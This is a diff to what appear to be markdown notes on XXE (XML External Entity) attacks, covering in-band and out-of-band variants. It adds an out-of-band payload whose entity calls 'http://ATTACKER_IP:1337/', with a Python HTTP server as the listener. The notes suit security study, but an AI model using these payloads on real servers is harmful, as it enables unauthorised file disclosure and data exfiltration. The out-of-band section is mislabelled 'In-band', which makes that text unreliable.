@@ -7,9 +7,9 @@ XML -  **Extensible Markup Language**  is typically used by applications to stor
 
 
 ### XXE IN BAND
-In-band refers to an vulnerability where the attacker can see the response from the server.
+In-band refers to an vulnerability where the attacker **CAN** see the response from the server.
 
-Example:
+Example(using burp sutie):
 ```
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
@@ -20,11 +20,20 @@ Example:
 <message>hacked</message>
 </contact>
 ```
-
+If the server is vulnerable it executes the **xxe** entity 
 
 ## XXE OUT OF BAND
+In-band refers to an vulnerability where the attacker **CAN'T** see the response from the server.
 
+Example(using burp sutie):
+```
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
+<upload><file>&xxe;</file></upload>
+```
 
+If the server is vulnerable it executes the **xxe** entity and sends the data to the server. ``python -m http.server``
 
 
 ## SSRF + XXE
